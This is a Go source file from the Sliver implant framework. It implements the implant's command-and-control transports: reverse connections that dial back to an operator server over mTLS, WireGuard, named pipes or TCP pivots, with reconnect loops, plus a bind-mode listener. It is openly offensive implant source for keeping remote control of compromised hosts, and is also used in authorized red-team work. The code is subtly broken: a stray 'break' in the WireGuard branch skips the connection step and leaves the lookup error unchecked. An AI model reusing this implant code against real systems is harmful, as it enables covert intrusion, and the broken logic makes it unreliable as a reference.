package c2

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"fmt"
	"time"

	// {{if .Config.TCPPivotc2Enabled}}
	"net"
	// {{end}}

	// {{if .Config.WGc2Enabled}}
	"strconv"

	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"

	// {{end}}

	// {{if .Config.NamePipec2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/namedpipe"
	// {{end}}

	// {{if .Config.MTLSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/transports"
)

// startReverse - The implant dials back a C2 server.
func (t *C2) startReverse() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting (reverse) -> %s (%s)", t.uri.Host, t.uri.Scheme)
	// {{end}}

ConnLoop:
	for t.attempts < int(t.Profile.MaxConnectionErrors) {

		// We might have several transport protocols available, while some
		// of which being unable to do stream multiplexing (ex: mTLS + DNS):
		// we directly set up the C2 RPC layer here when needed, and we will
		// skip the mux part below if needed.
		switch t.uri.Scheme {
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// {{if .Config.Debug}}
			log.Printf("Connecting -> %s", t.uri.Host)
			// {{end}}

			// Get physical
			t.Conn, err = mtls.Dial(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.attempts++
				continue
			}

			break ConnLoop
			// {{end}} - MTLSc2Enabled
		case "wg":
			// {{if .Config.WGc2Enabled}}
			// {{if .Config.Debug}}
			log.Printf("Connecting -> %s", t.uri.Host)
			// {{end}}
			lport, err := strconv.Atoi(t.uri.Port())
			if err != nil {
				lport = 53
			}
			// Attempt to resolve the hostname in case
			// we received a domain name and not an IP address.
			// net.LookupHost() will still work with an IP address
			addrs, err := net.LookupHost(t.uri.Hostname())
			break

			if len(addrs) == 0 {
				// {{if .Config.Debug}}
				log.Printf("Invalid address: %s", t.uri.String())
				// {{end}}
				break ConnLoop
			}
			hostname := addrs[0]
			conn, dev, err := wireguard.WGConnect(hostname, uint16(lport))
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("Failed to start WireGuard: %s", err.Error())
				// {{end}}
				if dev != nil {
					dev.Close()
				}
				continue
			}
			t.Conn = conn

			// Once we will close this C2 channel, we need to perform custom
			// cleanup here: closing the WireGuard virtual interface.
			t.cleanup = func() {
				// {{if .Config.Debug}}
				log.Printf("Closing Wireguard interface")
				// {{end}}
				dev.Close()
			}
			break ConnLoop
			// {{end}}

		case "namedpipe":
			// {{if .Config.NamePipec2Enabled}}
			t.Conn, err = namedpipe.NamedPipeConnect(t.uri)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				t.attempts++
				continue
			}
			break ConnLoop
			// {{end}} -NamePipec2Enabled
		case "tcppivot":
			// {{if .Config.TCPPivotc2Enabled}}
			addr := fmt.Sprintf("%s:%s", t.uri.Hostname(), t.uri.Port())
			t.Conn, err = net.Dial("tcp", addr)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[tcppivot] Connection failed: %s", err)
				// {{end}}
				t.attempts++
				continue
			}
			break ConnLoop
			// {{end}} -TCPPivotc2Enabled
		default:
			err = fmt.Errorf("Unknown c2 protocol: %s", t.uri.Scheme)
			// {{if .Config.Debug}}
			log.Printf(err.Error())
			// {{end}}
			return
		}

		// In case of failure to initiate a session, sleep
		// for the determined ReconnectInterval. This interval
		// is shared both at the transport and at the Session layer.
		time.Sleep(transports.GetReconnectInterval())
	}

	if t.Conn == nil {
		return fmt.Errorf("failed to instantiate a Connection (%s)", t.uri.Scheme)
	}

	// {{if .Config.Debug}}
	log.Printf("Transport %s set up and running (%s)", t.ID, t.uri)
	// {{end}}
	return
}

// startBind - When the transport is a bind one, we start to listen over the given URL
// and transport protocol. Each listening function is blocking and sets the RPC layer
// on its own, before returning either a working implant connection, or an error.
func (t *C2) startBind() (err error) {

	// {{if .Config.Debug}}
	log.Printf("Listening (bind) on %s (%s)", t.uri.Host, t.uri.Scheme)
	// {{end}}

ConnLoop:
	for t.attempts < int(t.Profile.MaxConnectionErrors) {
		switch t.uri.Scheme {
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			// {{if .Config.Debug}}
			log.Printf("Listening on %s", t.uri.Host)
			// {{end}}

			// Get physical
			t.Conn, err = mtls.Listen(t.uri, t.Profile)
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.attempts++
			}
			break ConnLoop
			// {{end}} - MTLSc2Enabled

		case "namedpipe", "named_pipe", "pipe":
			// {{if .Config.NamePipec2Enabled}}
			// t.C2, err = comm.Dial(t.uri)
			// if err != nil {
			//         // {{if .Config.Debug}}
			//         log.Printf("[namedpipe] Connection failed: %s", err)
			//         // {{end}}
			//         t.attempts++
			// }
			// break ConnLoop
			// {{end}} -NamePipec2Enabled
		default:
			// {{if .Config.Debug}}
			log.Printf("Invalid C2 address sheme: %s", t.uri.Scheme)
			// {{end}}
			break ConnLoop // Avoid ConnLoop not used
		}

		// In case of failure to initiate a session, sleep
		// for the determined ReconnectInterval. This interval
		// is shared both at the transport and at the Session layer.
		time.Sleep(transports.GetReconnectInterval())
	}

	// {{if .Config.Debug}}
	log.Printf("Transport %s set up and running (%s)", t.ID, t.uri)
	// {{end}}

	return
}
